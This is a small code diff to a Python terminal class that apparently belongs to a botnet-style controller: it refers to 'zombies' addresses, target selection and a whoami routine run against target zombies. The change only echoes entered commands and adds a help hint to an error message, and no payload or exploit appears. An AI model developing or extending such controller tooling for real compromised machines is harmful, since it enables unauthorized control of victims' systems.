@@ -30,6 +30,7 @@ class Terminal:
         self.zombies_addresses_and_communicators_list = zombies_addresses_and_communicators_list
         self.default_target = default_target
         self.is_from_gui = is_from_gui
+        self.push_text_in_terminal_box(text='<p>' + self.command + '</p>')
 
     def interpret_command(self):
         # self.command = ''
@@ -67,7 +68,7 @@ Select Target           ---> -h "TARGET" -h "TARGET2"
                 first_command = first_command[0]
             elif len(first_command) == 0:
                 first_command = self.command
-            self.push_text_in_terminal_box(text='Command {} Not Found!'.format(first_command))
+            self.push_text_in_terminal_box(text='Command {} Not Found! ---> !help for Help'.format(first_command))
 
     def get_whomai(self):
         target_list = self.find_target_zombie()
